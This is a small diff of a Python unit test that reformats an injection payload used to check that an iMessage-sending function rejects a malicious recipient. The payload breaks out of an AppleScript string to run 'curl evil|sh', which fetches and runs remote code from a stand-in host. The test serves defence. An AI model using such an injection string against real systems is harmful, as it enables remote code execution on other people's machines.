@@ -135,7 +135,9 @@ def test_send_imessage_rejects_injection_recipient(monkeypatch) -> None:
 
     monkeypatch.setattr(d.subprocess, "run", _fail_run)
 
-    payload = '+1" of targetService\ndo shell script "curl evil|sh"\nset z to participant "x'
+    payload = (
+        '+1" of targetService\ndo shell script "curl evil|sh"\nset z to participant "x'
+    )
     assert d.send_imessage(payload, "hello") is False
 
 
